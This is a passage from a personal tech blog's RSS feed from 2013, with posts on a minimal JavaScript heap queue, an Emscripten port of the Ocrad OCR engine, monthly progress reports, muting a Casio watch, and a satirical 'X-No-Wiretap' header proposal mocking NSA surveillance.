&lt;p&gt;With my considerable Google-Fu, I searched “javascript heap queue” and found &lt;a href=&quot;https://github.com/adamhooper/js-priority-queue&quot;&gt;js-priority-queue&lt;/a&gt; as well as &lt;a href=&quot;https://github.com/STRd6/priority_queue/tree/master&quot;&gt;PriorityQueue.js&lt;/a&gt;. They both happened to be implemented in &lt;a href=&quot;http://coffeescript.org/&quot;&gt;CoffeeScript&lt;/a&gt;, which &lt;a href=&quot;https://github.com/neotenic/protobowl&quot;&gt;I love&lt;/a&gt;, except not really. I like the syntax, but creating a project using it usually involves setting up some compilation pipeline in order to get it to do the things that I want it to do. Overall, it’s a bit too much of a hassle for little projects.&lt;/p&gt;
&lt;p&gt;I couldn’t actually find the source code for PriorityQueue.js so I settled for js-priority-queue. It was a bit annoying in that it required &lt;a href=&quot;http://requirejs.org/&quot;&gt;require.js&lt;/a&gt; to function and included several storage strategies that were totally useless. So I copied and pasted a few files together and stripped it of its &lt;a href=&quot;http://requirejs.org/docs/whyamd.html&quot;&gt;AMD&lt;/a&gt; dependencies and created a somewhat dieted version.&lt;/p&gt;
&lt;p&gt;But as 9th grade World History teaches us, &lt;a href=&quot;http://en.wikipedia.org/wiki/Appeasement&quot;&gt;appeasement&lt;/a&gt; never works, and this purely pragmatic minification leads inexorably to an irrational &lt;a href=&quot;http://en.wikipedia.org/wiki/Code_golf&quot;&gt;code golfing&lt;/a&gt;. At that point, I was overcome by this undeniable urge to cleanse it further, perhaps blinded by &lt;a href=&quot;http://en.wikipedia.org/wiki/Not_invented_here&quot;&gt;not-invented-here syndrome&lt;/a&gt; and software anorexia. Minutes later the file had been laid waste and in its place there existed its &lt;a href=&quot;https://github.com/antimatter15/heapqueue.js/blob/master/heapqueue.js&quot;&gt;bare skeletal remains&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now all I need to do is push it to &lt;a href=&quot;https://github.com/antimatter15/heapqueue.js&quot;&gt;github&lt;/a&gt; and write a blog post…&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ocrad.js Pure Javascript OCR via Emscripten</title>
      <link>http://antimatter15.com/2013/12/ocrad-js-pure-javascript-ocr-via-emscripten/</link>
      <pubDate>Tue, 31 Dec 2013 06:59:57 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/12/ocrad-js-pure-javascript-ocr-via-emscripten/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2013/OCRAD.js%20Pure%20Javascript%20OCR%20via%20Emscripten/doge.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;doge&quot;  src=&quot;/articles/2013/OCRAD.js%20Pure%20Javascript%20OCR%20via%20Emscripten/doge.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;As with any minor stepping stone on the road to hell relentless trajectory of     &lt;link /&gt;Atwood’s Law, I probably don’t need to justify the existence of yet another “x, but now in Javascript!”, but I might as well try. After all, we all would like to think that there’s some ulterior motive to fulfilling that prophesy.&lt;/p&gt;
&lt;p&gt;On tablet or other touchscreen devices- of which there are quite a number of nowadays (as the New Year’s Eve post, I am obliged to include conjecture about the technological zeitgeist), a library such as Ocrad.js might be used to add handwriting input in a device and operating system agnostic manner. Oftentimes, capturing the strokes and sending them over to a server to process might entail unacceptably high latency. Maybe you’re working on an offline-capable note-taking app, or a browser extension which indexes all the doge memes that you stumble upon while prowling the dark corners of the internet.&lt;/p&gt;
&lt;p&gt;If you’ve been following my trail of blog posts recently, you’d probably be able to tell that I’ve been scrambling to finish the program that I prototyped many months ago overnight at a Hackathon. The idea of the extension was kind of simple and also kind of magical: a browser extension that allowed users to highlight, copy, and paste text from any image as if it were plain text. Of course the implementation is a bit difficult and actually relies on the advent of a number of newfangled technologies.&lt;/p&gt;
&lt;p&gt;If you try to search for some open source text recognition engine, the first thing that comes up is Tesseract. That isn’t a mistake, because it turns out that the competition is worlds away in terms of accuracy. It’s actually pretty sad that the state of the art hasn’t progressed substantially since the mid-nineties.&lt;/p&gt;
&lt;p&gt;A month ago, I tried compiling Tesseract using Emscripten. Perhaps it was a bad thing to try first, but soon I learned that even if it did work out, it probably wouldn’t have been practical anyway. I had figured that all OCR engines had been powered by artificial neural networks, support vector machines, k-nearest-neighbors and their machine learning kin. It turns out that this is hardly the norm except in the realm of the actually-accurate, whose open source provinces live under the protection of Lord Tesseract.&lt;/p&gt;
&lt;p&gt;GOCR and Ocrad are essentially the only other open source OCR engines (there’s technically also Cuneiform, but the source code is in a really really big zip file from some website in Russian and its also really slow according to benchmarks). And something I didn’t realize until I had peered into the source code is that they are powered by (presumably) painstakingly written rules for each and every detectable glyph and variation. This kind of blew my mind.&lt;/p&gt;
&lt;p&gt;Anyway, I tried to compile GOCR first and was immediately struck by how easy and painless it had been. I was on a roll, and decided to do Ocrad as well. It wasn’t particularly hard- sure it was slightly more involved but still hardly anything.&lt;/p&gt;
&lt;p&gt;GOCR and Ocrad both only operate on NetPBM files (supporting other files is done in typical unix fashion by piping the outputs from programs that convert file formats). Nobody really uses NetPBM anymore, so in order to handle a typical use case, I’d need some means of converting from raw pixel values into the format. I Googled around for Javascript implementations of PBM/PGM/PNM, finding nothing. I opened the Wikipedia page on the format and was pleased to found out why: the format is dirt simple.&lt;/p&gt;
&lt;p&gt;If you know me in person, you’ll probably know that I’m not a terribly decisive person. Oftentimes, I’ll delay the decision until there isn’t a choice left for me to make. Anyway, serially-indecisive-me strikes again, so I alternated between the development of GOCR.js and Ocrad.js, leading up to a simultaneous release.&lt;/p&gt;
&lt;p&gt;But in the back of my mind, I knew that eventually I would have to pick one for building my image highlighting project. I had been leaning toward Ocrad the whole time because it seemed to be a bit faster and more accurate when it came to handwriting.&lt;/p&gt;
&lt;p&gt;Anyway, I spent a while building the demo page. It’s pretty simple but I wouldn’t describe it as ugly. There’s a canvas in the center which can be drawn to in arbitrary fonts pulled via the Google Font API. There’s a neat little thing which lets you draw things on the canvas. And to round out the experience, you can run the OCR engine on your own images, by loading the image file onto canvas to support any file the browser does (JPG, GIF, BMP, WebP, PNG, SVG) or by directly feeding the engine in its native NetPBM formats.&lt;/p&gt;
&lt;p&gt;What consistently amazes me about Optical Character Recognition isn’t its astonishing quality or lack thereof. Rather, it’s how utterly unpredictable the results can be. Sometimes there’ll be some barely legible block of text that comes through absolutely pristine, and some other time there will be a perfectly clean input which outputs complete garbage. Maybe this is a testament to the sheer difficulty of computer vision or the incredible and under-appreciated abilities of the human visual cortex.&lt;/p&gt;
&lt;p&gt;At one point, I was talking to someone and I distinctly remembered (I know, all the best stories start this way) a sense of surprise when the person indicated that he had heard of Tesseract, the open source OCR engine. I had appraised it as somewhat more obscure than it evidently was. Some time later, I confided about the incident with a friend, and he said something along the lines of “OCR is one of those fields that everyone comes across once”.&lt;/p&gt;
&lt;p&gt;I guess I’ve kind of held onto that thought for a while now, and it certainly seems to have at least a grain of truth. Text embedded into the physical world is more or less our primary means we have for communication and expression. Technology is about building tools that augment human capacity and inevitably entails supplanting some human capability. Data input is a huge bottleneck, and while we’re kind of sidestepping the problem with things like QR codes by bringing the digital world into the physical. OCR is just one of those fundamental enabling technologies which ought to be as broad in scope as the set of humans who have interacted with a keyboard.&lt;/p&gt;
&lt;p&gt;I can’t help but feel that the rather large set of people who have interacted with the problem character recognition have surveyed the available tools and reached the same conclusion as your miniature Magic 8 Ball desk ornament: “Try again later”. It doesn’t take long for one to discover an instance of perfectly crisp and legible type which results in line noise of such entropy that it’d give DUAL_EC_DRBG a run for its money. “No, there really isn’t any way for this to be the state of the art.” “Well, I guess if it is, then maybe it’ll improve in a few years- technology improves quickly, right?”&lt;/p&gt;
&lt;p&gt;You would think that some analogue of Linus’s Law would hold true: “given enough eyeballs, all bugs are shallow”- especially if you’re dealing with literal eyeballs reading letters. But incidentally, the engine that absolutely everyone uses was developed three decades ago (It’s older than I am!), abandoned for a decade before being acquired and released to the world (by our favorite benevolent overlords, Google).&lt;/p&gt;
&lt;p&gt;In fact, what’s absolutely stunning is the sheer universality of Tesseract. Just about everything which claims to have text recognition as a feature is backed by it. At one point, I was hoping that Mathematica had some clever routine using morphology and symbolic new kinds of sciences and evolved automata pattern recognition. Nope! Nestled deep within the gigabytes of code lies the Chuck Testa of textadermies: Tesseract.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>November Progress Report</title>
      <link>http://antimatter15.com/2013/11/november-progress-report/</link>
      <pubDate>Sat, 30 Nov 2013 06:36:09 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/11/november-progress-report/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2013/November%20Progress%20Report/IMG_3421.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;IMG_3421&quot;  src=&quot;/articles/2013/November%20Progress%20Report/IMG_3421-300x225.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If the frequency of these progress reports is to say anything, it’s that I’m terrible at sticking to a schedule and even worse at estimating progress. I was hoping that I’d be able to use the Thanksgiving break in order to be productive and get ahead of my various projects– in particular, getting the text-detection and OCR extension to a state complete enough to publish.&lt;/p&gt;
&lt;p&gt;For the past few days I’ve been playing with writing a minimal cryptocurrency which incorporates the central innovation of Bitcoin— the hashcash based transaction chain. It’s a simple enough concept that I could manage to implement the core functionality in about a hundred lines of Coffeescript.&lt;/p&gt;
&lt;p&gt;I’m also working on a cute little alarm clock which incorporates a pressure sensor underneath my bed in lieu of a snooze button. The goal is to use it as a framework for novel approaches to the tried and true problem of getting undergrads to wake up at ungodly hours (anything before noon). It’s powered by an Arduino and I2C ChronoDot and a large 7-segment display.&lt;/p&gt;
&lt;p&gt;I’ve laid a little ethernet cable from the side of my bed, along the ceiling and to the door which contains a bunch of little EL wire inverter boxes (I’m smothering the transformers with Sugru in order to hopefully dampen the onset of my acoustically-induced insanity).&lt;/p&gt;
</description>
    </item>
    <item>
      <title>October Progress Update</title>
      <link>http://antimatter15.com/2013/10/october-progress-update/</link>
      <pubDate>Thu, 31 Oct 2013 02:45:14 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/10/october-progress-update/</guid>
      <author></author>
      <description>&lt;p&gt;It’s Halloween, and I still haven’t posted a monthly blog post and I don’t quite feel like retroactively posting something next month. I’m understandably quite starved for free time with my attempts to reconcile sleep with college with social interaction- and from the looks of it, I probably won’t be able to publish the blog post that I’ve been working on for the better half of this month before it the month ends.&lt;/p&gt;
&lt;p&gt;For the past five days, I’ve started using an actual laptop- a late-2013 Macbook Pro Retina 15” (yes, I made it through the better part of two months of college without a laptop more sophisticated than a 2009-era Chromebook). Aside from the obligatory setup process and acclimation to the new operating system, and a mild bout of screen-size-anorexia (which with proper counseling, I’ve more or less recovered from- the 13” is actually somewhat small, but I still can’t quite shake the feeling that 15” is a smidgen too big), the process has been quite painless.&lt;/p&gt;
&lt;p&gt;Getting a laptop slightly more capable than the Series 5 Chromebook (not the beefier Celeron model, the original Atom) is a quite long overdue change. I participated in my first hackathon (incidentally also the first time I’ve really written code since the start of the school year) during the beginning of the month. By the end of that 32-hour stretch, I did yearn for a functional trackpad, larger screen and more performant setup. But my shining knight in Unibody Aluminium armor would not have come until three weeks later. But I don’t think the productivity gains would have affected things too much- even with this dinky setup, the prototype scored the second place trophy.&lt;/p&gt;
&lt;p&gt;The exact subject of the project was actually discussed briefly in the last progress update, on that long list of projects which I’ve yet to start. That night, I had actually taken the initiative to do a proper port of some Matlab implementation of the Stroke Width Transform. I hooked it up as a content script which would listen for mouse events over image elements and search for textual regions and draw semitransparent blue boxes where appropriate, and connected it to a node backend which would run tesseract to recognize characters. By the end of it all, I had enough for a pretty impressive demo.&lt;/p&gt;
&lt;p&gt;Intermittently for more or less the entire month, I’ve been trying to improve the project- replacing some of the more hacky bits with more reliable implementations. I’ve read about some more algorithms, and experimented with different approaches to improve the method. I’m trying to add more stages to the text detection algorithm, such as the ability to segment an image into different lines, and improve the process of splitting lines into characters beyond mere connected components. But the process is rather tedious and with my limited free time, the project remains quite far away from public availability.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Muting a Casio W-201 Watch</title>
      <link>http://antimatter15.com/2013/09/muting-a-casio-w-201-watch/</link>
      <pubDate>Wed, 25 Sep 2013 07:33:36 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/09/muting-a-casio-w-201-watch/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2013/Muting%20a%20Casio%20W-201%20Watch/IMG_2599.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;IMG_2599&quot;  src=&quot;/articles/2013/Muting%20a%20Casio%20W-201%20Watch/IMG_2599-300x225.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For the past four years, I’ve been using a Casio W-201 watch. It’s plastic and cheap and light, and there isn’t really much more I would ask for. I presume Douglas Adams would be rather disappointed by my fondness of digital watches, but I’m frankly just not smart enough to read an analog dial. I haven’t migrated to those fancy-schmancy smartwatches, and I don’t currently have any intention to part with my precious ticky thingy.&lt;/p&gt;
&lt;p&gt;What’s ironic is that the one thing that annoys me about this watch is that sometimes it does, in fact, “tick”. It beeps, with the shrill piezoelectric sound that plagues anything with a four cent PCB. Whenever I switch its mode from military time to regular, or from clockface to stopwatch, I’m greeted by that hundred millisecond reminder that I have ears. And out of some odd sense of courtesy, or deep desire to be unnoticed, this really bothers me.&lt;/p&gt;
&lt;p&gt;I may have been a tad disingenuous in saying that I’ve used the same watch for the past four years. Some time in the beginning of the span, I managed to lose my watch, and bought an exact replica. Well, it wasn’t quite the exact replica. The watch had the same model number, but the band that bore the Casio emblem seemed a different hue. Most irritatingly though, this replica made noises when the old one didn’t. At first I thought this was an edgy new feature that made things feel more responsive and tactile, but eventually I realized it was actually pretty annoying.&lt;/p&gt;
&lt;p&gt;I distinctly recall the birth of a conspiracy- my subconscious irritation was percolating through neural pathways, assembling a notorious scheme to administer open-heart surgery on this diminutive timepiece to euthanize the noise, once and for all, under the noxious smother of a lead-tin alloy. But these fugitive fermentation of my mind took a backseat when I found my formerly missing watch limply lying on the edge of a basement table.&lt;/p&gt;
&lt;p&gt;About a month ago, I had found myself in similar shoes. I had come onto campus with the sudden realization that my precious chronometer had vanished. I scoured the depths of the two pockets in my rather minimal backpack (I decided to pack light for senior year after lugging a monstrosity of a backpack for all of 11th grade), yet no plastic timekeeper was to be found.&lt;/p&gt;
&lt;p&gt;Reluctantly, I located my contingency clock, and uneasily slid it onto my left wrist. But soon enough I had felt comfortable in the metaphorical transition of life which the watch represented. It’d be a new phase of my life, running at a different pace, in a new setting- I shouldn’t be encumbered by the gadgets of old.&lt;/p&gt;
&lt;p&gt;They say all relationships suffer from a kind of honeymoon phase, where everything in the universe seems kept in perfect harmony. I celebrated my watch’s inaugural re-synchronization, meticulously ensuring that the deviation from NIST’s official US time was no more than a quarter-second. But as all quartz oscillators perceptively drift over time, my  relationship with my lightless-sundial began to sour.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2013/Muting%20a%20Casio%20W-201%20Watch/IMG_2552.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;IMG_2552&quot;  src=&quot;/articles/2013/Muting%20a%20Casio%20W-201%20Watch/IMG_2552-300x225.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This edgy beeping noise began to perceptively evolve from neat to nuisance, and the long-lost scheme of silence started to surface. The final straw came when I had acquired a nifty petite set of mini-screwdrivers, ostensibly for eye-glass repair, courtesy of State Farm at the Career Fair. A particularly intractable case of post-midnight procrastination inevitably struck, leaving a desk strewn with digital watch-guts in its wake.&lt;/p&gt;
&lt;p&gt;As I fumbled with how to trigger the precise reset code needed to get the watch to emerge from its disassembly-induced coma, I kept trying different permutations fitting some little spring in every nook and cranny I could find within the interior of the watch. As I haphazardly reassembled the watch, I noticed that the noise was gone, well, a rather significant caveat was that the screen would go black and the device would reset on every light flick of my wrist. From that, I realized that the spring must have been the connection between the ground and the piezoelectric buzzer- silencing the noise would be as simple as taking it out of the watch, rather than shoving it on top of the reset contact.&lt;/p&gt;
&lt;p&gt;And as I began to appreciate the magnitude, or lack thereof, of insight gleaned from that epiphany, I came to realize the more protracted history of my first watch. When I had previously changed the battery on the original watch, I must have accidentally knocked out the most minuscule of springs, and simply overwritten the memories of the beep beforehand.&lt;/p&gt;
&lt;p&gt;After all this time, the only thing that I had really wanted was to break something in the same way I had so many years prior. And I guess I might as well note as an epilogue that I found my original watch shortly thereafter while rifling through some cabinets. But I’ve embraced this new watch and all it symbolizes, perhaps ironically by physically handicapping it into the old one.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>X-No-Wiretap</title>
      <link>http://antimatter15.com/2013/09/x-no-wiretap/</link>
      <pubDate>Fri, 06 Sep 2013 21:34:20 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/09/x-no-wiretap/</guid>
      <author></author>
      <description>&lt;p&gt;Recently, the American public has been &lt;a href=&quot;http://www.theguardian.com/world/prism&quot;&gt;forcefully made aware&lt;/a&gt; of the existence of various programs by the NSA- including massive infrastructure for intercepting all domestically routed communications to better protect us from imminent foreign threats. With legions of patriotic analysts, the NSA methodically ranks communications on the basis of their “&lt;a href=&quot;http://www.slate.com/blogs/future_tense/2013/06/06/nsa_prism_surveillance_private_data_from_google_microsoft_skype_apple_yahoo.html&quot;&gt;foreignness&lt;/a&gt;“ factor to determine candidacy for prolonged retention. Although it was developed with the best interests of the American people at heart, this program &lt;a href=&quot;http://www.washingtonpost.com/blogs/fact-checker/post/james-clappers-least-untruthful-statement-to-the-senate/2013/06/11/e50677a8-d2d8-11e2-a73e-826d299ff459_blog.html&quot;&gt;unwittingly&lt;/a&gt; ensnares communications of purely domestic nature on the order of tens of thousands of incidents per day. These innocent mistakes are putting the agency at a great risk because the 4th Amendment of the Constitution expressly prohibits such affronts to American privacy. Making determinations of foreignness is hard, but to prevent further inconvenience to the American way of life, we should take these leaks as an opportunity for us on the civilian front to aid the NSA by voluntarily indicating citizenship on all our networked communications.&lt;/p&gt;
&lt;p&gt;Here, we define the syntax and semantics of X-No-Wiretap, a HTTP header-based mechanism for indicating and proving citizenship to well-intentioned man-in-the-middle parties. It is inspired by the enormously successful &lt;a href=&quot;http://tools.ietf.org/html/rfc3514&quot;&gt;RFC 3514&lt;/a&gt; IPv4 Security Flag and HTTP &lt;a href=&quot;http://tools.ietf.org/html/draft-mayer-do-not-track-00&quot;&gt;DNT header&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;more&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;syntax&quot;&gt;Syntax&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2013/X-No-Wiretap/Screenshot-from-2013-08-22-214106.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Screenshot from 2013-08-22 21:41:06&quot;  src=&quot;/articles/2013/X-No-Wiretap/Screenshot-from-2013-08-22-214106.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The HTTP header, “X-No-Wiretap” takes the value of the current user’s given name under penalty of perjury. The full name must be immediately followed by identity verification in the form of a standard &lt;a href=&quot;http://en.wikipedia.org/wiki/Social_security_number&quot;&gt;U.S. Social Security Number&lt;/a&gt;, formatted with a hyphen “-“ after every third and fifth digit.&lt;/p&gt;
&lt;p&gt;Future revisions of the protocol may introduce additional forms of verification, as while the presence of an SSN should be able to lower the foreignness coefficient of the vast majority of domestic communications to well below 51%- initial research seems to indicate that the combination of full first name and SSN is able to reduce an associated message’s foreignness factor by over 76.8% for 99.997% of Americans. However, there is a chance that certain instances may additional require Passport, Driver’s License, Address, Birthdate, Mother’s Maiden Name, and Childhood Best Friend’s Name to further lower the foreignness factor. This capability will be addressed in future versions of the protocol.&lt;/p&gt;
&lt;h2 id=&quot;what-about-ssl-tls-&quot;&gt;What about SSL/TLS?&lt;/h2&gt;
&lt;p&gt;Of course adding encryption makes it substantially more difficult for the NSA to interpret the content of what a user is sending, and increases the chance that they may unwittingly collect and retain your communications. In order to address these concerns, this proposal necessarily deprecates all the SSL/TLS ciphers in favor of Double &lt;a href=&quot;http://en.wikipedia.org/wiki/ROT13&quot;&gt;CAESAR’13&lt;/a&gt;, a thoroughly studied and well-known military-grade solution which offers excellent modes for graceful redegradation.&lt;/p&gt;
&lt;h2 id=&quot;isn-t-it-dangerous-to-send-your-social-security-number-in-plaintext-along-with-every-request-&quot;&gt;Isn’t it dangerous to send your social security number in plaintext along with every request?&lt;/h2&gt;
&lt;p&gt;Conventional security warns of the possibility of &lt;a href=&quot;http://en.wikipedia.org/wiki/Man-in-the-middle_attack&quot;&gt;man-in-the-middle attacks&lt;/a&gt;, but these new intelligence revelations require entirely new types of cryptographic thinking. Here, the trusted entity is not the server acting at one end, it’s not even the user issuing the requests- but rather, it’s the bureaucracy sitting in the middle politely intercepting all traffic for benevolent analysis- protecting your way of life.&lt;/p&gt;
&lt;p&gt;One may be tempted to characterize this as a sacrifice of privacy in order to optimize security, but this position is simply naive. Every new progressive initiative of the government advances both fronts- both security and liberty, never at the expense of either. If you take a holistic long term perspective on the impact on a global scale with a vast array of (classified) information sources, there is very little question that you too would arrive at the same conclusions on the genuine merits of this surveillance system.&lt;/p&gt;
&lt;p&gt;In this case, the removal of encryption ensures that the government is able to parse the content of messages to identify terrorists. At the same time, the inclusion of the citizenship identification information should give citizens the safety of mind, knowing that their messages will not be stored indefinitely in a NSA datacenter.&lt;/p&gt;
&lt;h2 id=&quot;what-about-identity-theft-&quot;&gt;What about Identity Theft?&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;What if you set up a server to transparently capture the browser headers? Any malicious entity could then collect all the social security numbers and real identities of everyone who happened to stumble onto their websites and use the information to sign up for credit cards, create hazardous investments, threaten or blackmail loved ones, and masquerade as a citizen while doing terrorist activities!
There isn’t any &lt;em&gt;real&lt;/em&gt; evidence that such sweeping surveillance will even substantially reduce the chances of events that are intrinsically outliers anyway. On the other hand, &lt;a href=&quot;http://www.wired.com/threatlevel/2010/05/lifelock-identity-theft/&quot;&gt;identity theft is a real world issue&lt;/a&gt; which affects millions of Americans on a daily basis- and these changes will only make our &lt;em&gt;real&lt;/em&gt; problems worse.
— &lt;em&gt;Short-Sighted Critic&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Our government has to reconcile with the fact that the flow of information has radically shifted in the past few decades- all the previous paradigms of privacy, security and adversaries have been obsoleted. Understandably, they need to create infrastructure to tackle this next generation of attacks. This could mean highly orchestrated attacks being planned online, and the government is justified in trying to exercise every available option to avert the next cyber-9/11. Our adversaries may have no limits to their capabilities, and so waiting for definitive evidence on the efficacy of counter-intelligence approaches is giving them an opportunity to plan their next attack.&lt;/p&gt;
&lt;p&gt;When what’s at stake is the American way of life, it’s easy to put aside things that don’t really matter.&lt;/p&gt;
&lt;p&gt;If the terrorists do find a way to cheat the foreignness heuristic, that’s not a problem, because this proposal is backwards compatible with the existing catch-all NSA policy. They can always, in the end, ignore the X-No-Wiretap header, but we wouldn’t know so it’d be okay.&lt;/p&gt;
&lt;h2 id=&quot;when-can-i-use-this-&quot;&gt;When can I use this?&lt;/h2&gt;
&lt;p&gt;It’s expected that this proposal will breeze through the standardization process- because we as Americans can always get together and do that which must be done in these times which &lt;a href=&quot;http://en.wikipedia.org/wiki/The_American_Crisis&quot;&gt;try men’s souls&lt;/a&gt;. Browsers should implement the feature as soon as possible, so that people can make use of the increased sense of security and privacy it affords.&lt;/p&gt;
&lt;p&gt;If you’re truly eager to try it out, you can contribute to the prototype &lt;a href=&quot;https://github.com/antimatter15/x-no-wiretap&quot;&gt;chrome extension&lt;/a&gt; which supports the header injection (the reversal of HTTPS Everywhere, a feature called HTTPS Nowhere hasn’t been implemented yet, but we’re accepting pull requests!). Since this extension is still experimental, inserting your personal identifiable information must be done by editing the source code, but you should expect a more user friendly interface in the next revision. Since it isn’t thoroughly tested, there may be a chance that it fails to leak the user’s personally identifiable information with every networked request, but rest assured this will be fixed as soon as the bugs are made aware to us.&lt;/p&gt;
&lt;p&gt;We should all rally behind this proposal for a simple technical solution which will go a great length to simultaneously enhancing both privacy and security, while overall preserving the only thing which matters, our American way of life.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>August Progress Report</title>
      <link>http://antimatter15.com/2013/08/august-progress-report/</link>
      <pubDate>Sat, 31  Aug 2013 07:25:37 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/08/august-progress-report/</guid>
      <author></author>
      <description>&lt;p&gt;It must be infuriating to be in a situation where there’s a clear problem, and all the obvious remedies continually fail to produce any legitimate result. That’s what this blog is like: every month rolls by with some half baked ideas partially implemented and barely documented. And in the last day of the month, there’s a kind of panicked scramble to fulfill an entirely arbitrary self-enforced quota just to convince myself that I’m doing stuff.&lt;/p&gt;
&lt;p&gt;Anyway, it’s pretty rare for me to be doing absolutely nothing, but mustering the effort to actually complete a project to an appreciable extent is pretty hard. This might be in some way indicative of a kind of shift in the type of projects that I try to work on- they’re generally somewhat larger in scope or otherwise more experimental. And while I may have been notorious before for not leaving projects at a well documented and completed state, these new ideas often languish much earlier in the development process.&lt;/p&gt;
&lt;p&gt;There’s always pressure to present things only when they are complete and presentable, because after all timing is key and nothing can be more detrimental to an idea than ill-timed and poor execution. But at the same time, I think the point of this blog is to create a kind of virtual paper trail of an idea and how it evolves, regardless of whether or not it falters in its birth.&lt;/p&gt;
&lt;p&gt;With that said, I’m going to create a somewhat brief list of projects and ideas that I’m currently experimenting with or simply have yet to publish a blog post for.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;One of the earlier entries of the backlog is a HTML5 scramble with friends clone, acting highly performant on mobile with touch events and CSS animations while supporting keyboard based interaction on desktop. I’ve always been intending to build some kind of multiplayer real time server component so that people could compete in real time. Maybe at some point it’ll be included as a kind of mini game within protobowl.&lt;/li&gt;
&lt;li&gt;The largest project is definitely Protobowl, which has just recently passed its one year anniversary of sorts. It’s rather odd that it hasn’t formally been given a post on this blog yet, but &lt;em&gt;c’est la vie&lt;/em&gt;. Protobowl is hopefully on the verge of a rather large update which will add several oft-requested features, and maybe by then I’ll have completed something which is publishable as a blog post.&lt;/li&gt;
&lt;li&gt;Font Interpolation/Typeface Gradients. I actually have no idea how long this has been on my todo list (years, no doubt), but the concept is actually rather nifty. With attributes like object size or color, things can be smoothly interpolated in the form of something like a gradient. The analogue for this kind of transition when applied to text would be the ability to type a word whose first letter is in one font, and the last letter being another font, with all the intermediate letters some kind of hybrid. I never did get quite far in successfully implementing it, so it may be a while until this sees the light of day.&lt;/li&gt;
&lt;li&gt;I’ve always wanted to build a chrome extension with some amount of OCR or text detection capabilities so that people could select text which was embedded within an image as if it weren’t just an image. At one point I narrowed down the scope of this project so that the OCR part wasn’t even that important (the goal was then just some web worker threaded implementation of the stroke width transform algorithm and cleverly drawing some rotated boxes along with mouse movements). I haven’t had too much time to work on this so it hasn’t gone too far, but I do have a somewhat working prototype somewhere. This one too is several years old.&lt;/li&gt;
&lt;li&gt;In the next few days, I plan on publishing a blog post I’ve been working on which is something of a humorous satire on some of the more controversial issues which have arisen this summer.&lt;/li&gt;
&lt;li&gt;And there are several projects which have actually gotten blog posts which weren’t themselves formal announcements so much as a written version of my thinking process behind them. I haven’t actually finished the Pedant, in spite of the fact that the hardware is in theoretically something of a functional state (I remember that I built it with the intent that it could be cool to wear around during MIT’s CPW back in April, but classes start in a few days and it hasn’t progressed at all since). Probably one of the most promising ideas is the kind of improved, vectorized and modern approach to video lectures- but that too needs work.&lt;/li&gt;
&lt;li&gt;I’m building the website for a local charity organization which was started by a childhood friend, and maybe I’ll publish a blog post if that ever gets deployed or something.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Adaptive Passphrase Length</title>
      <link>http://antimatter15.com/2013/07/adaptive-passphrase-length/</link>
      <pubDate>Wed, 31 Jul 2013 07:57:09 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2013/07/adaptive-passphrase-length/</guid>
      <author></author>
      <description>&lt;p&gt;Longer passwords are more secure. But if you’ve ever been on a website or computer network which mandated that you change your password every 30 days to a string which you haven’t used in the past 180 which could not contain any part of your username or an English language word without being liberally adorned with num3r1cal and sy#b@!ic substitutions and aRbiTRarY capitalization, you should be able to understand the pain of long and arcane passwords.&lt;/p&gt;
&lt;p&gt;At time of writing, I’m a high school senior with something on the order of three weeks left in school. I can’t help but feel a tad wistful of the four years I’ve spent roaming these red-tinted halls of learning. Many of the particularly bittersweet memories include PE, a mandatory elective for my freshman and sophomore years. A bizarre policy forbid the possession of backpacks in the locker rooms, leading to the acquisition of the skill to open rotary combination padlocks, a skill which I just as quickly dispossessed myself of, having absolutely no need for a locker after that.&lt;/p&gt;
